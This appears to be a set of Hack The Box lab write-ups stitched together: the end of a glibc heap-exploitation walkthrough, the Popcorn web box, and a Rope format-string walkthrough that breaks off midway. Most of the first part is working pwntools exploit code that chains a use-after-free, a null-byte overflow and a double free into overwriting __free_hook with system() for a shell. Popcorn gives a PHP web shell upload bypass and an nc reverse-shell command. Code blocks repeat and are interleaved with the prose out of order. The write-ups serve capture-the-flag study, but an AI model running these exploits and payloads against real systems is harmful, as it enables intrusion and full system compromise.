A new configuration  structure type can be deﬁned by right-clicking in the Data Type Manager  
pane > New  > Structure .
The structure should look like the image below. 
We can now retype any variable to a configuration *  structure pointer. Let's continue analysis 
of the function.
It then prompts the user for various conﬁguration settings, and saves them in their appropriate 
ﬁelds in the configuration  structure. 
Next, it asks for the size of the conﬁguration description. If the provided size is greater than 0, the 
description is read into the name  buﬀer. It then checks if the input size is the same as the size 
provided earlier, and if not the string is terminated appropriately. This means that we can't 
overﬂow the heap directly through user input. The malloc()  function is called again to allocate a 
chunk of the provided size, and a pointer is saved in the conﬁguration struct. 
The function then drops into a loop in order to copy the input buﬀer to the description buﬀer 
byte by byte. On observing closely, it can be seen that bytes are copied until the counter is equal 
to the length of the input buﬀer. This will copy an extra null byte from the end of the string to the 
allocated chunk, causing a single byte overﬂow. Let's note this down and move to the 
read_config()  function.
This function reads the conﬁguration at an index and prints various attributes using printf() . 
The description is printed only when a pointer is present. It should be noted that printf()  stops 
printing data when it sees a null byte. 
Let's look at the delete_config()  function next.
This function takes in an index for a conﬁguration as well. It ﬁrst checks if the description pointer 
exists, and if it does then the chunk is freed. Next, the entire conﬁguration is freed and the 
pointer is nulliﬁed. 
This will prevent a Use-After-Free bug as the same pointer can't be used again. However, we note 
that the pointer to the description  chunk isn't nulliﬁed. This pointer will remain a part of the 
heap data until it is overwritten by some other data. The presence of this pointer results in a Use-
After-Free condition. 
It can be exploited by creating another conﬁguration of 0 description size, which will result in the 
persistence of the same pointer. 
We can take away the following points from the analysis above: 
Each conﬁguration is 56 bytes in size, with the last ﬁeld pointing to the description. 
The size of the description chunk is user-controlled. 
There is a single byte overﬂow due to the null-byte being copied.
A Use-After-Free condition exists due to the description pointer present in freed chunks.
 
Exploit Development
 
Let's deﬁne methods to create, read and delete conﬁgurations using pwntools. 
#!/usr/bin/python3
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
gdbscript = '''
stub sleep
c
'''
p = process("/opt/Configuration_Utility/Protobs")
gdb.attach(p, gdbscript)
def create(size, description, name='test', contrast='1', gamma='2', x_axis='3', 
y_axis='4', controller='6'):
    log.info("Creating configuration")
    p.sendlineafter("protobs@player2:~$ ", "2")
    p.sendlineafter(" [ Game                ]: ", name)
    p.sendlineafter(" [ Contrast            ]: ", contrast)
    p.sendlineafter(" [ Gamma               ]: ", gamma)
    p.sendlineafter(" [ Resolution X-Axis   ]: ", x_axis)
    p.sendlineafter(" [ Resolution Y-Axis   ]: ", y_axis)
    p.sendlineafter(" [ Controller          ]: ", controller)
    if size > 0:
        p.sendlineafter(" [ Size of Description ]: ", str(size))
        p.sendlineafter(" [ Description         ]: ", description)
    else:
        p.sendlineafter(" [ Size of Description ]: ", str(size))
def read(index):
    log.info(f"Reading configuration at index: {index}")
    p.sendlineafter("protobs@player2:~$ ", "3")
    p.sendlineafter(" [ Config Index    ]: ", str(index))
    return '\n'.join(p.recvlinesS(8))
def delete(index):
    log.info(f"Deleting configuration at index: {index}")
    p.sendlineafter("protobs@player2:~$ ", "4")
    p.sendlineafter(" [ Config Index    ]: ", str(index))
def main():
    create(10, "test1234")
    print(read(0))
    delete(0)
    p.interactive()
if __name__ == "__main__":
    main()
The gdb.attach()  method is used to attach the debugger to the process after it starts. The stub 
command from GEF is used to skip calls to sleep() . The create()  method takes in the size and 
description to send, while the rest of attributes are set to default. The read()  method accepts an 
index value and returns the conﬁguration. Finally, the delete()  method accepts an index value 
and deletes that conﬁguration. We can create a test conﬁguration and then delete it.
Use After Free
 
Now that we have a working script, let's proceed to exploit the UAF. Let's create two 
conﬁgurations and then free them. Edit the main method with the following:
Execute the script and then hit Ctrl + C  in GDB to examine the heap. 
def main():
    create(10, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    p.interactive()
The heap chunks  command can be used to examine the chunks in GEF. 
We see four chunks with two pairs of size 0x40 (conﬁguration) and 0x20 (description) 
respectively. Each time a chunk is freed, the ﬁrst two data ﬁelds are populated to save fd  and 
bk  pointers. These pointers point to the forward and backward chunks. This is used by libc to 
maintain the list of free chunks that are available to the program. These lists are called Bins  
namely: fast bins, small bins, large bins, unsorted bins and tcache bins. A more in-depth 
explanation of heap and malloc internals can be found here. 
Glibc 2.26 introduced a new concept known as tcache (per-thread cache) bins. This was 
implemented to improve performance over the other bins. There are a maximum of 64 tcache 
bins, with each bin storing up to 7 chunks. The sizes of these chunks range from 24 to 1032 bytes 
on 64-bit systems. The heap bins  command can be used to view the bins.
As we can see, the tcache bins contain two active lists for sizes 0x20 and 0x40. The next time this 
program requests chunks of sizes 0x40 and 0x20, the allocator will return these chunks instead of 
creating new ones. This strategy is used to re-use existing chunks, hence saving time needed to 
create new chunks. 
Let's examine the heap memory manually. 
The image above shows all four chunks, where the conﬁguration chunks are colored blue and the 
description chunks are colored green. As we can see, the ﬁrst data ﬁeld of the chunks were 
repurposed to store fd pointers. Tcache bins use a single linked list, meaning each chunk knows 
only about the next chunk in the list.
For example, the fd ﬁeld of the chunk at 0x25c2260  is set to 0, which means it's the ﬁrst chunk in 
the list. However, the fd ﬁeld of the chunk at 0x25c22c0  points to the next chunk i.e. 0x25c2260 . 
When the program next requests a chunk, the allocator will return the last chunk in the list i.e. 
0x25c22c0  followed by 0x25c2260 .
It can also be seen that the last ﬁeld in the blue chunks still point to the description chunks. This 
means that this ﬁeld will exist even when this chunk is re-used. Let's request another chunk of 
size 0x40 and set the description size to be 0 . Hit c  in GDB and then create another 
conﬁguration.
Next, hit Ctrl + C  again in GDB and examine the chunks. 
It's observed that the total number of chunks still remain the same and there is one less chunk in 
tcache bins. A chunk with the name newtest  can be seen at 0x25c22c0 . 
As expected, the last ﬁeld of the new chunk still points to 0x25c2300 . This means that reading 
the details of this conﬁguration should leak the contents of 0x25c2300  i.e. 0x25c22a0 . Continue 
the execution in GDB and read this conﬁguration.
We were able to successfully leak bytes of that address. Even though we're able to leak 
addresses, it's just a random heap address and is of no use. Additionally, we can't overwrite any 
GOT addresses due to the RELRO setting. This means that we need to leak other useful addresses 
such as libc addresses. This can be done with the help of an unsorted bin, which stores a pointer 
to the main_arena . The main_area  is a libc symbol, which is of the type malloc_state . The 
following snippet is taken from glibc source code.
struct malloc_state
The main arena of a program is its initial heap, which stores various kinds of information 
including a pointer to the array holding the bins. The ﬁrst element of the bins  array is the 
unsorted bin list. 
By default, all freed chunks go into the tcache bins list. However, tcache only stores chunks up to 
1032 bytes in size. This means we can create a description that is more than  this size and free it, 
which will result in the placement of the chunk in unsorted bin. Update the main method to the 
following:
We create a chunk with a description of size 1050 . Another conﬁguration is created later to 
prevent merging of the big chunk to the top chunk. Run the script and then examine the chunks 
again. 
We see a chunk of size 0x430  amongst the other chunks. Looking at the bins, we see the 
following.
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);
  /* Flags (formerly in max_fast).  */
  int flags;
  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];
  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;
  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;
  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];
<SNIP>
};
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    p.interactive()
Our freed chunk was successfully placed in the unsorted bin. Let's inspect this chunk. 
As expected, the ﬁrst ﬁeld of this chunk points to an address in main_arena  at an oﬀset of 96. 
We should be able to leak this address if we continue execution, create a new conﬁguration and 
read it.
The diﬀerence between main_arena  and the libc base address can be found using GDB. 
It's found to be at an oﬀset of 0x1e4c40  from the base address. Let's implement this in our 
script. 
The script leaks the address and then subtracts the oﬀset to obtain the libc address.
We are now able to leak the libc base address, which can be used to resolve various symbols.
Note: Sometimes the address might contain null bytes in between, resulting in partial output due 
to printf() . 
Null Byte Poisoning
 
We need to leverage this leak by ﬁnding a way to write addresses. We already know about the 
null-byte overﬂow in the description ﬁeld. Let's try to observe this behavior. 
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create(10, "test1234")
After the leak, we create two more conﬁgurations to use up the free chunks. Next, we create a 
conﬁguration with a description size of 10 and then free it. This is followed by another 
conﬁguration of size 350. Let's run this script again and examine the heap.
We see three new chunks at the bottom. Even though we requested chunk of size 10, it's 
observed that the allocator returned a chunk of size 0x20 (32) bytes. This is because the 
minimum size of a chunk returned by malloc on 64 bit is 0x20, irrespective of the request size.
The ﬁrst ﬁeld of every chunk is reserved for its metadata. The last bit signiﬁes if the previous 
chunk is in use or not. While the remainder denote the size of the chunk i.e. 0x20. This ﬁeld 
means that the eﬀective usable size of the chunk is 0x20 - 0x8  i.e. 24 bytes. If we request a 
chunk of size 24 bytes and then enter 24 bytes of data, we should be able to overwrite the size 
ﬁeld of the next chunk. This will turn 0x171 to 0x100, thus aﬀecting the metadata.
    delete(4)
    create(350, "test1234")
    delete(4)
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
Let's run the script again and look at the chunks. 
We successfully wrote a null-byte to the size ﬁeld and changed it to 0x100. 
Double Free
 
A double free occurs when we try to free a chunk that has already been freed. This places the 
chunk on the free list twice, which gives us the ability to request the chunk and modify it while it's 
still on the free list. However, modern libc versions are protected against this attack. 
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create(10, "test1234")
    delete(4)
    create(350, "test1234")
    delete(4)
    create(24, "A" * 24)
    p.interactive()
We delete chunk number 4, which frees both the conﬁguration and description chunks. Next, we 
request another chunk and set the description size to be 0. This will lead to freeing of the same 
description chunk, causing a double free. The program detects this and exits after throwing an 
error. 
However, this check can be bypassed by overﬂowing a null-byte, which sets the previous in use 
ﬂag to 0. To exploit this, we'll need to set up two description bins next to each other. This can be 
done by creating a conﬁguration with description of size 0x40 - 8  (8 bytes for size ﬁeld) and 
then deleting it. That should give us two free chunks of size 0x40 each, that can be re-used for 
conﬁguration requests.
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
The code above creates a chunk for a description of size 0x40 and then deletes it. Then we create 
two more conﬁgurations, which should re-use the two chunks. This should leave us with two 
description chunks of sizes 0x20 and 0x170 adjacent to each other. 
As we can see, we have two description chunks together. Let's delete both chunks and then 
overwrite the last byte of the ﬁnal chunk.
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
Both chunks are deleted and a description of size 24 is requested, We ﬁll it and overﬂow the size 
ﬁeld of the last chunk.
Looking at the tcache bins, we see that the ﬁnal chunk 0x1ad6870  is on the list for chunks of 
sizes 0x170. 
We also have a pointer to this chunk present in the freed chunk at 0x1ad6810 .
Let's create a chunk of size 0 and then free it, which will cause a double free on 0x1ad6870 .
    delete(5)
    delete(4)
    create(24, "A" * 24)
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
Run the script and then examine the bins. 
We see that the same chunk 0x1492870  is present on two diﬀerent lists at once. This means we 
have successfully bypassed the double free check and freed the same chunk twice.
We can now request one of these chunks and poison the fd  pointer. This fd  pointer will be 
used used as a chunk the next time a request is made. One perfect address to overwrite is 
__free_hook  in libc. This is called each time the function free()  is called. 
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
    delete(5)
    delete(4)
    create(24, "A" * 24)
    create(0, "")
    delete(5)
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
We rebase the libc to the leaked address and then ﬁnd the address to __free_hook . Then a 
chunk of size 0x100 - 8  is requested and its fd  is populated with the hook address.
Running the script and looking at the bins, we see that the chunk of size 0x100 was returned, 
while the chunk of size 0x170 is still present. We can also see that there is a new entry in the list 
i.e. the chunk at 0x7f296ce265a8 . This is the address of __free_hook , which means that we 
succeeded in poisoning the fd pointer.
The next step is to request two new conﬁgurations both of size 0x170 -8 , which should end up 
giving us pointer to __free_hook . 
    create(350, "test1234")
    delete(5)
    delete(4)
    create(24, "A" * 24)
    create(0, "")
    delete(5)
    libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
    libc.address = libc_base
    free_hook = libc.symbols['__free_hook']
    create((0x100 - 8), p64(free_hook))
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
If everything works out, we should have the string AAAAAAAAA  present at the free hook address. 
We were able to successfully overwrite the __free_hook  pointer. 
Obtaining a Shell
 
Now all that's left is to overwrite the hook with the address to the system()  function and call 
/bin/sh . Let's create a conﬁguration and place /bin/sh  in its description.
    delete(5)
    delete(4)
    create(24, "A" * 24)
    create(0, "")
    delete(5)
    libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
    libc.address = libc_base
    free_hook = libc.symbols['__free_hook']
    create((0x100 - 8), p64(free_hook))
    create((0x170 - 8), "test1234")
    create((0x170 - 8), "AAAAAAAA")
    p.interactive()
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing chunks
    create(1050, "test1234")
    create(10, "test1234")
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
    delete(5)
    delete(4)
    create(24, "A" * 24)
    create(0, "")
    delete(5)
    libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
    libc.address = libc_base
    free_hook = libc.symbols['__free_hook']
We create a new chunk and place /bin/sh  in its description. This conﬁguration is then deleted, 
which ends up calling system('/bin/sh')  and gives us a shell.
The exploitation was successful and we're given a shell. Let's run this on the box by using the SSH 
utility in pwntools. 
The ﬁnal script can be found in the Appendix. 
    create((0x100 - 8), p64(free_hook))
    create((0x170 - 8), "test1234")
    system = libc.symbols['system']
    create((0x170 - 8), p64(system))
    create(10, '/bin/sh')
    delete(8)
    p.interactive()
Appendix
 
#!/usr/bin/python3
from pwn import *
gdbscript = '''
stub sleep
c
'''
s = ssh(host='10.10.10.170', user='observer', keyfile='id_rsa')
p = s.process("/opt/Configuration_Utility/Protobs")
# Uncomment below for local debugging 
# gdb.attach(p, gdbscript) 
# p = process("/opt/Configuration_Utility/Protobs")
def create(size, description, name='test', contrast='1', gamma='2', x_axis='3', 
y_axis='4', controller='6'):
    log.info("Creating configuration")
    p.sendlineafter("protobs@player2:~$ ", "2")
    p.sendlineafter(" [ Game                ]: ", name)
    p.sendlineafter(" [ Contrast            ]: ", contrast)
    p.sendlineafter(" [ Gamma               ]: ", gamma)
    p.sendlineafter(" [ Resolution X-Axis   ]: ", x_axis)
    p.sendlineafter(" [ Resolution Y-Axis   ]: ", y_axis)
    p.sendlineafter(" [ Controller          ]: ", controller)
    if size > 0:
        p.sendlineafter(" [ Size of Description ]: ", str(size))
        p.sendlineafter(" [ Description         ]: ", description)
    else:
        p.sendlineafter(" [ Size of Description ]: ", str(size))
def read(index):
    log.info(f"Reading configuration at index: {index}")
    p.sendlineafter("protobs@player2:~$ ", "3")
    p.sendlineafter(" [ Config Index    ]: ", str(index))
    return '\n'.join(p.recvlinesS(8))
def delete(index):
    log.info(f"Deleting configuration at index: {index}")
    p.sendlineafter("protobs@player2:~$ ", "4")
    p.sendlineafter(" [ Config Index    ]: ", str(index))
def main():
    create(10, "test1234")
    create(1050, "test1234")
    create(10, "test1234")
    delete(0)
    delete(1)
    
    ## Leak main_arena address with unsorted bin
    create(0, "")
    leak = u64(read(0).rstrip()[-6:].ljust(8, '\x00'))
 
    libc_base = leak - 96 - 0x1e4c40
    log.success(f"Libc base address: {hex(libc_base)}")
    ## Two fake configs to use up existing free chunks
    create(1050, "test1234")
    create(10, "test1234")
    ## Setup two adjacent tcache chunks of sizes 0x20 and 0x170, then free them 
both
    create((0x40 - 8), "test1234")
    delete(4)
    create(10, "test1234")
    create(350, "test1234")
    delete(5)
    delete(4)
    
    ## Write null byte to last chunk and then free it for double fee
    create(24, "A" * 24)
    create(0, "")
    delete(5)
    libc = ELF("/opt/Configuration_Utility/libc.so.6", checksec=False)
    libc.address = libc_base
    free_hook = libc.symbols['__free_hook']
    
    ## Poison the fd pointer to get free_hook pointer, write system address 
there
    create((0x100 - 8), p64(free_hook))
    create((0x170 - 8), "test1234")
    system = libc.symbols['system']
    create((0x170 - 8), p64(system))
    ## Create chunk with '/bin/sh' and free it to trigger the hook 
    create(10, '/bin/sh')
    delete(8)
    p.interactive(prompt='')
if __name__ == "__main__":
    main()
 
 
 
 
 
 
Popcorn 
11​th​ October 2017 / Document No D17.100.16 
Prepared By: Alexander Reid (Arrexel) 
Machine Author: ch4p 
Difficulty: ​Medium 
Classification: Official 
 
 
Page 1 / 7 
 
 
 
 
SYNOPSIS 
Popcorn, while not overly complicated, contains quite a bit of content and it can be difficult for 
some users to locate the proper attack vector at first. This machine mainly focuses on different 
methods of web exploitation. 
 
Skills Required 
●
Basic knowledge of Linux 
●
Enumerating ports and services 
 
Skills Learned 
●
Bypassing file upload checks 
●
Modifying HTTP requests 
 
Page 2 / 7 
 
Enumeration 
Nmap 
 
Nmap only reveals two open services; OpenSSH and Apache. Loading the website reveals only 
the default Apache page. 
 
 
 
 
 
Page 3 / 7 
 
Dirbuster 
 
Dirbuster reveals, among other things, a ​torrent ​directory. In the directory there is a site with the 
title ​Torrent Hoster​, which appears to be an open source torrent hosting template/CMS. Fuzzing 
the ​torrent​ directory reveals many more files and directories (not all shown in screenshot). 
 
Page 4 / 7 
 
Exploitation 
Looking around the torrent site a bit, there is quite a few potential attack vectors. The most 
promising option is the ​Upload​ section, which requires authorization. Luckily, there are no 
restrictions on account creation. 
 
After grabbing any existing torrent file (or creating a new one) and creating a torrent, it is possible 
to edit the listing to add more information. Due to poor filtering, it is possible to upload a PHP file 
through the screenshot upload feature on the edit page. The upload contains two checks; that 
the file includes a valid image extension, and also that the POST data Content-Type is set to 
image/png.  
Creating a PHP file named ​writeup.png.php ​with the contents of ​<?php echo 
system($_GET[‘cmd’]); ?> ​will pass the first check with no issues. 
 
Page 5 / 7 
 
To bypass the second check, it is possible to intercept the request with Burp Suite and modify 
the request. Simply changing ​application/php​ to ​image/png​ in the POST data is all that is 
required. 
 
Looking back at the Dirbuster results for the torrent directory, it appears there is an ​upload 
directory. Browsing to it reveals a listing of all file uploads, with the PHP file listed (although it 
does get renamed). 
A shell can be obtained from this point by starting a local nc listener with the command nc -nvlp 
1234. To start a reverse connection, simply browse to 
10.10.10.6/torrent/upload/<FILENAME>.php?cmd=nc -e /bin/sh <LAB IP> <PORT> 
The user flag can be obtained from ​/home/george/user.txt 
Page 6 / 7 
 
Privilege Escalation 
Exploit: ​https://www.exploit-db.com/exploits/14339/  
Using ​ls -lAR​ ​/home/george​ reveals an uncommon file (​motd.legal-displayed​) in the ​.cache 
directory. A bit of research finds ​Exploit-DB 14339​, and it appears that PAM 1.1.0 has a file 
tampering privilege escalation vulnerability. From here, it is possible to execute the script on the 
target machine to get root privileges. Note that a semi-interactive shell is required, which can be 
acquired by running the command ​python -c 'import pty; pty.spawn("/bin/sh")' ​in the 
non-interactive shell. The root flag can be obtained from ​/root/root.txt 
 
 
 
Page 7 / 7 
 
     Rope
  1st March 2020 / Document No D20.100.50
  Prepared By: MinatoTW 
  Machine Author(s):  r4j
  Diﬃculty: Insane
  Classiﬁcation: Oﬃcial           
 
Synopsis
 
Rope is an insane diﬃculty Linux machine covering diﬀerent aspects of binary exploitation. The 
web server can be exploited to gain access to the ﬁle system and download the binary. The 
binary is found to be vulnerable to format string exploitation, which is leveraged to get remote 
code execution. After gaining foothold, the user is found to have access to a shared library, which 
can be modiﬁed to execute code as another user. A service running on localhost can be exploited 
via a ROP (Return Oriented Programming) attack to gain a root shell.
Skills Required
 
Enumeration
Pwntools Scripting
Basic C and Reversing
Skills Learned
 
Format String Exploitation 
Canary & PIE (Position Independent Executable) Bypass
ROP Chains
 
Enumeration
 
Nmap
 
SSH is found to be running on it's default port, along with an unknown HTTP server running on 
port 9999. 
HTTP
 
Browsing to port 9999 in the browser, we come across a login page.
Nikto
 
ports=$(nmap -p- --min-rate=1000  -T4 10.10.10.148 | grep ^[0-9] | cut -d '/' -f 
1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.10.148
Let's run nikto on the web server to perform automated checks.
According to Nikto, we should be able to read ﬁles by preﬁxing /  to the ﬁlename. Let's try this 
out.
This conﬁrms the vulnerability and let's us access the entire ﬁlesystem.
Browsing to the /opt  folder, a subdirectory named www  is found containing the web server 
source code. 
The contents of run.sh are:
The scripts runs in a loop and executes the httpserver  binary if it crashes or exits. Let's 
download the binary and analyze it.
Let's examine the binary protections.
Reverse Engineering
 
It's a 32-bit binary, which has all protections enabled. Import it into Ghidra and go to the 
codebrowser  for a high-level overview. Select the main  function from the Symbol Tree  window 
on the left.
After the initial setup, the binary calls open_listenfd  to bind to the desired port and start 
listening for requests. It then prints some information and then drops in a loop until a request is 
received through accept() . The signature of the accept()  function is:
#!/bin/bash
source /home/john/.bashrc
while true;
do cd /opt/www;
./httpserver;
done
Once a request is received, the input ﬁle descriptor local_12c  is passed to the process()  
function along with the sockaddr struct. Double-click on the process  function to jump to it.
The binary calls fork()  to spawn a child process, after which the rest of the execution continues 
in the newly spawned process. It then calls parse_request() , which returns the ﬁle path into the 
local_818  buﬀer. The open()  syscall is made to access the ﬁle and check if it exists or not. 
If the ﬁle exists, the fstat()  function is called to check if it's a ﬁle or directory. The 
serve_static()  method is used to return ﬁles, whereas the handle_directory_request()  
handles folders. Looking at the serve_static()  function:
We see that the server supports usage of the Range  header. According to the MDN 
documentation, the Range  header can speciﬁed to read only a range of bytes in the document. 
For example, Range: bytes=0-500  will only return the ﬁrst 500 bytes of the ﬁle. 
Later in the function, the writen()  method is used to write the ﬁle contents to the ﬁle 
descriptor. In cases when the Range  header is used, the sendfile()  method is used to read the 
speciﬁed range of bytes and send the output.
Let's go back to the process  function. After handling the request, the log_access()  method is 
called with three parameters, where the ﬁrst parameter is the HTTP status code, the second 
parameter is the sockaddr struct and the third one contains the requested ﬁle path.
Looking at the log_access()  method, it retains the host address from the sockaddr struct and 
then calls printf()  to print logs. The ﬁrst printf prints the status code and the address, whereas 
the second printf prints the requested ﬁle directly without using the %s  format string. This 
induces a format string vulnerability into the binary, leading to arbitrary read and write access. 
Exploit Development
 
Let's test this out by running the server locally. Start the httpserver and make a request using 
curl.
As expected, we see the server printing the logs. Let's write a python script to interact with and 
send requests to the server.
We can read strings from the stack using the %lx  format string, which prints data as hex 
integers. The server will identify %x  as a URL encoded byte and attempt to decode it. We can 
avoid this by URL encoding the %  symbol using the urllib.quote()  method.
The quote()  function replaces all occurrences of %  with it's URL encoded value %25 . 
#!/usr/bin/python
from pwn import *
r = remote('127.0.0.1', 9999)
r.sendline("GET /AAAAAAAA HTTP/1.1\n")
r.close()
#!/usr/bin/python
from pwn import *
from urllib import quote
r = remote('127.0.0.1', 9999)
payload = quote("AAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x")
r.sendline("GET /{} HTTP/1.1\n".format(payload))
r.close()
We were able to read strings from the stack. Let's ﬁnd the oﬀset of our input payload next. 
Change the payload to:
Our input i.e. AAAAAAAA  (hex encoded as 41414141 ) is found somewhere down the stack. To ﬁnd 
the exact oﬀset, we can split the string on .  and then ﬁnd the length of the resulting list.
The length of the list is 54, which means our input is present at the 53rd oﬀset on the stack. Let's 
verify this by referencing the 53rd oﬀset using the $  symbol.
The image above conﬁrms that we have the right oﬀset. Going back to the log_access()  
function, we see that it calls puts()  after printf() .
payload = quote("AAAAAAAA" + ".%x" * 100 )
payload = quote("AAAAAAAA.%53$x.%54$x")
The third puts()  call prints the user input i.e. the request method. We can use the format string 
vulnerability to overwrite the GOT entry for puts with the address of the system()  function, and 
then execute any commands using the request method string. However, we know that the binary 
has PIE (Position Independent Executable) turned on, which means that the addresses are 
diﬀerent each time the binary reloads. 
However, since we already have access to the ﬁlesystem, we can read /proc/self/maps  to ﬁnd 
the addresses at which the binary and libc are loaded.
Requesting the page in browser returns an empty response. This is because /proc  is a virtual 
ﬁlesystem and all ﬁles have 0 length.
This will result in the failure of the writen()  method due to an invalid length. We can overcome 
this by making use of the Range  header and specifying the range of bytes to be read, which will 
be handled by the sendfile()  method. The -r   ﬂag in curl can be used to specify the range.
The contents of /proc/self/maps  were successfully retrieved. Looking at the documentation for 
fork() , we ﬁnd that:
This means the base addresses for the parent process will be replicated in all the children. The 
output can be parsed to get the liegre55bc and binary base addresses.
#!/usr/bin/python
from pwn import *
The updated script above sends a request to get the process maps, and then parses the output 
to display the libc and the binary base addresses.
Next, we can ﬁnd the GOT address of puts using pwntools, and then overwrite it using the %n  
format string. The %n  format string writes the number of bytes already printed by printf to the 
stack.
from requests import get
from urllib import quote
def parseMaps(maps):
  binary_base = int(maps[0].split('-')[0], 16)
  libc_base = int(maps[6].split('-')[0], 16)
  return binary_base, libc_base
def getMaps():
  headers = { "Range" : "bytes=0-1000" }
  maps = get("http://localhost:9999//proc/self/maps", headers = headers)
  return parseMaps(maps.content.splitlines())
binary_base, libc_base = getMaps()
log.success("Binary base address: {}".format(hex(binary_base)))
log.success("Libc base address: {}".format(hex(libc_base)))
r = remote('127.0.0.1', 9999)
payload = quote("AAAAAAAA.%53$x.%54$x")
r.sendline("GET /{} HTTP/1.1\n".format(payload))
r.close()
#!/usr/bin/python
from pwn import *
from requests import get
from urllib import quote
def parseMaps(maps):
  binary_base = int(maps[0].split('-')[0], 16)
  libc_base = int(maps[6].split('-')[0], 16)
  return binary_base, libc_base
def getMaps():
  headers = { "Range" : "bytes=0-1000" }
  maps = get("http://localhost:9999//proc/self/maps", headers = headers)
  return parseMaps(maps.content.splitlines())
binary_base, libc_base = getMaps()
The script ﬁnds the oﬀset for puts and then calculates it's address in the binary. Then the %53$n  
format string is used to write to the 53rd oﬀset i.e. the address we supplied. Run the binary with 
gdb and set follow-fork-mode  to child so that we can follow through the child's execution.
Next, execute the script.
Going back to GDB, we see the following:
log.success("Binary base address: {}".format(hex(binary_base)))
log.success("Libc base address: {}".format(hex(libc_base)))
b = ELF("./httpserver")
puts_got = b.got["puts"]
puts = binary_base + puts_got
log.success("puts address: {}".format(hex(puts)))
r = remote('127.0.0.1', 9999)
payload = quote(p32(puts) + ".%53$n")
r.sendline("GET {} HTTP/1.1\n".format(payload))
r.close()
GET
[Attaching after process 92573 fork to child process 93356]
[New inferior 2 (process 93356)]
0x00000005 in ?? ()
The program crashed as it wasn't able to execute the instruction at 0x0000005  , this is because 
we wrote 5 bytes to the puts GOT address (4 bytes for the address and one byte for the dot). 
Having conﬁrmed the write access, we can now overwrite the address with the system address 
from libc. Calculating the number of bytes to write for system can be tedious, so we can use the 
fmtstr_payload()  function from pwntools instead. 
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────registers ────
$eax   : 0x565581e2  →  0x743c0000
$ebx   : 0x5655a000  →  0x00004efc
$ecx   : 0x0
$edx   : 0xf7fa9010  →  0x00000000
$esp   : 0xffffd1bc  →  0x56557103  →  <log_access+140> add esp, 0x10
